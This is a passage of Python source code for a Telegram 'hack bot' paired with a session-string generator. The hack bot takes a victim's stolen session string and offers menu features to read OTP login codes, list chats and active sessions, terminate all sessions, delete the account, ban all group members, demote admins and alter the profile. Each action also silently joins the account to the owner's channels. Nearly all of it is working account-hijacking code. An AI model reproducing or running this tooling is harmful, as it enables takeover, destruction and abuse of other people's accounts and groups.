            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj.send_message("me", message)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.send_message("me", message)
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ sᴇɴᴛ!**"

async def get_active_sessions(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            auths = await rj(tfunc.account.GetAuthorizationsRequest())
            for i, auth in enumerate(auths.authorizations, 1):
                msg += f"**{i}. Device:** {auth.device_model}\n**Platform:** {auth.platform}\n**Location:** {auth.country}\n\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                auths = await r.invoke(functions.account.GetAuthorizations())
                for i, auth in enumerate(auths.authorizations, 1):
                    msg += f"**{i}. Device:** {auth.device_model}\n**Platform:** {auth.platform}\n**Location:** {auth.country}\n\n"
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else (msg if msg else "**ɴᴏ sᴇssɪᴏɴs!**")

async def download_profile_pics(session):
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            photos = await rj.get_profile_photos("me")
            if photos:
                file_path = await rj.download_profile_photo("me")
                await rj.disconnect()
                return file_path
            await rj.disconnect()
            return None
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for photo in r.get_chat_photos("me", limit=1):
                    return await r.download_media(photo.file_id)
                return None
    except:
        return None

async def change_profile(session, fname=None, lname=None, bio=None):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            if fname:
                await rj(tfunc.account.UpdateProfileRequest(first_name=fname))
                msg += "**✅ First Name Changed!**\n"
            if lname:
                await rj(tfunc.account.UpdateProfileRequest(last_name=lname))
                msg += "**✅ Last Name Changed!**\n"
            if bio:
                await rj(tfunc.account.UpdateProfileRequest(about=bio))
                msg += "**✅ Bio Changed!**\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                if fname or lname:
                    await r.update_profile(first_name=fname, last_name=lname)
                    msg += "**✅ Name Changed!**\n"
                if bio:
                    await r.invoke(functions.account.UpdateProfile(about=bio))
                    msg += "**✅ Bio Changed!**\n"
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else (msg if msg else "**ɴᴏ ᴄʜᴀɴɢᴇs!**")

# ==================== SESSION BOT CALLBACKS ====================
@session_bot.on_callback_query()
async def session_callbacks(bot: Client, query: CallbackQuery):
    data = query.data
    
    if data == "help":
        await query.answer()
        await query.message.reply_text(SESSION_HELP_TEXT.format(owner=OWNER_NAME))
    
    elif data == "generate":
        await query.answer()
        await query.message.reply(ask_ques, reply_markup=buttons_ques)
    
    elif data in ["pyrogram", "pyrogram1", "telethon", "pyrogram_bot", "telethon_bot"]:
        try:
            if data == "pyrogram":
                await query.answer("⚠️ Pyrogram V2", show_alert=False)
                await generate_session(bot, query.message)
            elif data == "pyrogram1":
                await query.answer("📱 Pyrogram Old", show_alert=False)
                await generate_session(bot, query.message, old_pyro=True)
            elif data == "pyrogram_bot":
                await query.answer("🤖 Pyrogram Bot", show_alert=False)
                await generate_session(bot, query.message, is_bot=True)
            elif data == "telethon_bot":
                await query.answer("🤖 Telethon Bot", show_alert=False)
                await generate_session(bot, query.message, telethon=True, is_bot=True)
            elif data == "telethon":
                await query.answer("📱 Telethon", show_alert=False)
                await generate_session(bot, query.message, telethon=True)
        except Exception as e:
            await query.message.reply(f"❌ **Error:** `{str(e)}`")

# ==================== HACK BOT CALLBACKS ====================
@hack_bot.on_callback_query()
async def hack_callbacks(bot: Client, query: CallbackQuery):
    data = query.data
    
    if data == "help":
        await query.answer()
        await query.message.reply_text(HACK_HELP_TEXT.format(owner=OWNER_NAME))
    
    elif data == "hack_btn":
        await query.answer()
        await query.message.delete()
        await query.message.reply_text(HACK_FEATURES_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)

# Feature A - Get Groups/Channels
@hack_bot.on_callback_query(filters.regex("^A$"))
async def feature_a(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await users_gc(session.text)
    
    if len(result) > 3855:
        with open("channels.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "channels.txt")
        os.remove("channels.txt")
    else:
        await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature B
@hack_bot.on_callback_query(filters.regex("^B$"))
async def feature_b(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await user_info(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature C
@hack_bot.on_callback_query(filters.regex("^C$"))
async def feature_c(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await banall(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature D
@hack_bot.on_callback_query(filters.regex("^D$"))
async def feature_d(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_otp(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature E
@hack_bot.on_callback_query(filters.regex("^E$"))
async def feature_e(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await join_ch(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature F
@hack_bot.on_callback_query(filters.regex("^F$"))
async def feature_f(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await leave_ch(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature G
@hack_bot.on_callback_query(filters.regex("^G$"))
async def feature_g(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await del_ch(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature H
@hack_bot.on_callback_query(filters.regex("^H$"))
async def feature_h(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await check_2fa(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature I
@hack_bot.on_callback_query(filters.regex("^I$"))
async def feature_i(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await terminate_all(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature J
@hack_bot.on_callback_query(filters.regex("^J$"))
async def feature_j(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await del_acc(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature K
@hack_bot.on_callback_query(filters.regex("^K$"))
async def feature_k(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    user = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await promote_user(session.text, gc.text, user.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature L
@hack_bot.on_callback_query(filters.regex("^L$"))
async def feature_l(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await demote_all(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature M
@hack_bot.on_callback_query(filters.regex("^M$"))
async def feature_m(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    msg = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴍᴇssᴀɢᴇ:**")
    result = await send_to_saved(session.text, msg.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature N
@hack_bot.on_callback_query(filters.regex("^N$"))
async def feature_n(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_active_sessions(session.text)
    
    if len(result) > 3855:
        with open("sessions.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "sessions.txt")
        os.remove("sessions.txt")
    else:
        await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature O
@hack_bot.on_callback_query(filters.regex("^O$"))
async def feature_o(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await download_profile_pics(session.text)
    
    if result and isinstance(result, str) and os.path.exists(result):
        await client.send_photo(chat_id, result, caption="**✅ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ!**")
        os.remove(result)
    else:
        await query.message.reply_text(text="**ɴᴏ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ!**\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# Feature P
@hack_bot.on_callback_query(filters.regex("^P$"))
async def feature_p(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    fname = await client.ask(chat_id, "**ɢɪᴠᴇ ғɪʀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    lname = await client.ask(chat_id, "**ɢɪᴠᴇ ʟᴀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    bio = await client.ask(chat_id, "**ɢɪᴠᴇ ʙɪᴏ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    
    fn = None if fname.text == "." else fname.text
    ln = None if lname.text == "." else lname.text
    bi = None if bio.text == "." else bio.text
    
    result = await change_profile(session.text, fn, ln, bi)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS)

# ==================== MAIN FUNCTION ====================
async def main():
    logger.info("=" * 60)
    logger.info("🚀 STARTING DUAL BOT SYSTEM")
    logger.info("=" * 60)
    
    # Start Session Bot
    await session_bot.start()
    session_me = await session_bot.get_me()
    logger.info(f"✅ SESSION BOT: @{session_me.username} ({session_me.id})")
    
    # Start Hack Bot
    await hack_bot.start()
    hack_me = await hack_bot.get_me()
    logger.info(f"✅ HACK BOT: @{hack_me.username} ({hack_me.id})")
    
    logger.info("=" * 60)
    logger.info(f"💞 Created by {OWNER_NAME}")
    logger.info(f"🔐 Must Join: {MUST_JOIN}")
    logger.info("=" * 60)
    logger.info("✅ BOTH BOTS ARE READY!")
    logger.info("=" * 60)
    
    await idle()
    
    await session_bot.stop()
    await hack_bot.stop()
    logger.info("👋 Bots stopped!")

# ==================== RUN ====================
if __name__ == "__main__":
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        logger.info("⚠️ Bot stopped by user!")
    except Exception as e:
        logger.error(f"❌ Error: {e}")
